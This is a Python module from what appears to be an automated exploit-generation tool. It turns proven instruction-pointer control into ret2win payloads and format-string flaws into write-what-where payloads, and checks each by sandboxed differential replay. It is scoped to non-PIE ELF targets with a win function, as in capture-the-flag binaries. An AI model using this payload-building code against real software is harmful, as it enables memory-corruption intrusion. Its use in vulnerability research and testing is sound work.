"""Step 4 (doc 52 §3 part 5): hand a validated control-flow-hijack hypothesis to the exploit
ladder and climb to L3.

The hunt loop proves that the instruction pointer is attacker-controlled (a control-flow-hijack
hypothesis with a solved input). This turns that into a ret2win exploit:

  * find an attacker-chosen `win` function in the target (reuses the ladder's exploit.find_win);
  * RE-SOLVE the hijack through the driver with the saved return address pinned to the win address
    -- the solved input is FRAMING-AWARE (it still satisfies the path to the overflow), which is
    exactly what the old blind-cyclic recipes were missing;
  * confirm by a DIFFERENTIAL replay in the same sandbox the validator uses: the ret2win payload
    runs to a clean exit, while the identical payload with the return-address bytes corrupted
    crashes. Only the win address turned a crash into controlled flow, so arrival is proven without
    needing to know what win prints.

Honest ceiling (same as the ladder's): no-PIE x86-64/ELF with a fixed win address and a win that
terminates cleanly. RIP control with no win symbol, a PIE target, or a win that spawns a shell is
reported as L2 (control proven, payload built) -- never faked as L3.
"""
from __future__ import annotations

import base64
from pathlib import Path
from typing import Callable, Optional

import re
import struct

from . import engine
from .validate import Target, replay

_ET_EXEC = 2
_TOKEN = re.compile(rb"[A-Za-z][A-Za-z0-9 _]{3,}")   # behavioural output tokens (len>=4)


def _fmt_offset(target: Target, maxk: int = 30):
    """The format-argument index at which the input buffer sits (classic `%k$p` probe): deliver
    AAAAAAAA + %k$p and find the k whose output echoes 0x4141414141414141."""
    for k in range(4, maxk + 1):
        data = b"AAAAAAAA%" + str(k).encode() + b"$p"
        r = replay(target, target.exe, data)
        if b"4141414141414141" in (r.stdout + r.stderr).lower().replace(b"0x", b""):
            return k
    return None


def _www_payload(addr: int, slot: int) -> bytes:
    """A 64-bit write-what-where: a 16-byte format prefix (2 argument slots) that prints 2 chars
    then `%<slot>$hhn`, followed by the 8-byte target address placed AT that slot."""
    spec = b"AA%" + str(slot).encode() + b"$hhn"
    if len(spec) > 16:
        return b""
    return spec + b"A" * (16 - len(spec)) + struct.pack("<Q", addr & 0xffffffffffffffff)


def _tokens(b: bytes) -> set:
    return set(_TOKEN.findall(b))
_UNMAPPED = 0x0000414141414141        # canonical but unmapped: corrupting the ret slot to this crashes


def _etype(data: bytes) -> int:
    return int.from_bytes(data[16:18], "little" if data[5] == 1 else "big") if len(data) >= 18 else 0


def weaponize_fmt(target: Target, hyp, *, log=lambda _m: None) -> Optional[dict]:
    """Step 4 (B3): climb a confirmed format-string hypothesis to a write-what-where primitive.
    Finds the format offset, then demonstrates an arbitrary write by overwriting a writable global
    and observing a behavioural change the benign input does not produce -- a sound proof of the
    write-what-where (a new output token appears only because the write took effect)."""
    if hyp.kind != "format-string":
        return None
    try:
        data = Path(target.exe).read_bytes()
    except OSError:
        return None
    if data[:4] != b"\x7fELF" or target.mode not in ("arg", "stdin"):
        return None
    from ..analyze.poc import exploit
    if _etype(data) != _ET_EXEC:
        return {"level": "L2", "strategy": "fmt-www", "confirmed": True,
                "note": "format string is attacker-controlled but the target is PIE: a fixed "
                        "write address needs an info leak (out of scope)"}
    k = _fmt_offset(target)
    if k is None:
        return {"level": "L2", "strategy": "fmt-www", "confirmed": True,
                "note": "attacker controls the format string; could not pin the argument offset"}
    cands = [(n, a) for n, (a, _s) in sorted(exploit.elf_objects_sized(data).items(),
                                             key=lambda kv: kv[1][0]) if 0x400000 <= a < 0x800000]
    if len(cands) < 2:
        return {"level": "L2", "strategy": "fmt-www", "confirmed": True, "offset": k,
                "note": f"write-what-where primitive available (offset {k}); no writable globals "
                        f"to auto-confirm against"}

    def _behaviour(b):
        # Isolate output the WRITE caused from the echoed format string. The payload contains no
        # newline, so printf(fmt) echoes it all on the first line; everything AFTER the first
        # newline is the program acting on the (possibly overwritten) state. Diffing only this
        # against a baseline write removes the echoed address bytes that contaminated raw tokens.
        tail = b.split(b"\n", 1)[1] if b"\n" in b else b""
        return _tokens(tail)

    # Baseline = a BENIGN input (no write). A behavioural token present after the write but not on
    # the benign run is caused by the overwrite (the echoed format string is before the first
    # newline and excluded), so it is a sound proof of an observable arbitrary write -- and it
    # attributes to the global that actually controls the behaviour, not an incidental one.
    benign = replay(target, target.exe, b"hello")
    base_b = _behaviour(benign.stdout + benign.stderr)
    tried = 0
    for name, addr in cands:
        if tried >= 24:
            continue
        pay = _www_payload(addr, k + 2)
        if not pay:
            continue
        tried += 1
        r = replay(target, target.exe, pay)
        new = _behaviour(r.stdout + r.stderr) - base_b
        if new:                           # writing HERE produced output the benign run did not
            return {"level": "L3", "strategy": "fmt-www", "confirmed": True,
                    "offset": k, "target": name, "target_addr": addr,
                    "payload_b64": base64.b64encode(pay).decode(),
                    "evidence": f"write-what-where via %{k + 2}$hhn (format offset {k}): overwriting "
                                f"global '{name}'@{addr:#x} made the program print "
                                f"{sorted(t.decode('latin-1','replace') for t in new)[:3]} -- a "
                                f"behavioural change writing to another global does not cause"}
    return {"level": "L2", "strategy": "fmt-www", "confirmed": True, "offset": k,
            "note": f"write-what-where primitive available (format offset {k}; %{k + 2}$n gives an "
                    f"arbitrary write); no writable global with an observable effect was found to "
                    f"auto-confirm -- GOT/return-address overwrite is the analyst-in-the-loop step"}


def weaponize(target: Target, hyp, *, input_size: int = 300, budget: float = 60.0,
              mem_mb: int = 4096, log: Callable[[str], None] = lambda _m: None) -> Optional[dict]:
    """Climb a confirmed control-flow-hijack hypothesis to L3 ret2win. Returns an exploit dict
    (level L3 | L2) or None when the class/target is out of scope."""
    if hyp.kind != "control-flow-hijack" or not hyp.solutions:
        return None
    try:
        data = Path(target.exe).read_bytes()
    except OSError:
        return None
    if data[:4] != b"\x7fELF":
        return None
    from ..analyze.poc import exploit
    funcs = exploit.elf_functions(data)
    win_name, win_addr = exploit.find_win(funcs)
    if win_addr is None:
        return {"level": "L2", "strategy": "ip-control", "confirmed": True,
                "note": "the instruction pointer is attacker-controlled, but the binary has no "
                        "attacker-chosen win function (no win symbol, no local shell-caller) to "
                        "redirect to -- a full ROP chain is the next rung"}
    word = 8 if data[4] == 2 else 4
    if _etype(data) != _ET_EXEC:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"RIP control proven and a win function ({win_name}) exists, but the "
                        f"target is PIE: a fixed redirect needs an info leak (out of scope)"}
    log(f"weaponize: re-solving {hyp.id} with RIP pinned to {win_name}@{win_addr:#x}")
    out = engine.run_driver(target.exe, argv=target.argv, input_mode=target.mode, budget=budget,
                            input_size=input_size, mem_mb=mem_mb, extra={"hijack_to": win_addr})
    solved = [h for h in engine.hypotheses_from(out, target.exe)
              if h.kind == "control-flow-hijack" and h.solutions]
    if not solved:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"RIP control proven; could not solve a reaching input that redirects to "
                        f"{win_name} within the budget"}
    payload = solved[0].solutions[0].data
    win_le = (win_addr & ((1 << (word * 8)) - 1)).to_bytes(word, "little")
    # the address is often written by a string copy that stops at a NUL, so only its significant
    # (non-zero-high) bytes appear in the input; the upper bytes come from already-zero stack.
    win_min = win_le.rstrip(b"\x00") or b"\x00"
    if win_min not in payload:
        return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "note": f"built a redirect to {win_name}, but its address is not placed as a "
                        f"contiguous word in the input (indirect layout): not auto-confirmable"}
    # corrupt only the redirect bytes to an unmapped low address, same length and no new NUL, so
    # the overflow is otherwise identical -- only the destination changes.
    corrupt = payload.replace(win_min, b"\x11" * len(win_min), 1)
    rp = replay(target, target.exe, payload)
    rc = replay(target, target.exe, corrupt)
    won = (not rp.crashed) and (not rp.timed_out) and rc.crashed
    b64 = base64.b64encode(payload).decode()
    if won:
        return {"level": "L3", "strategy": "ret2win", "confirmed": True, "win": win_name,
                "win_addr": win_addr, "payload_b64": b64,
                "evidence": f"redirected execution to {win_name}@{win_addr:#x}: the payload runs to "
                            f"a clean exit, while the identical payload with the return address "
                            f"corrupted crashes ({rc.signal}) -- only the win address controls flow"}
    return {"level": "L2", "strategy": "ret2win", "confirmed": True, "win": win_name,
            "win_addr": win_addr, "payload_b64": b64,
            "note": f"built a framing-aware ret2win payload to {win_name}@{win_addr:#x}; clean "
                    f"arrival not auto-confirmed (payload crash={rp.crashed}, control crash={rc.crashed}) "
                    f"-- hand to the exploit ladder's breakpoint confirmation"}
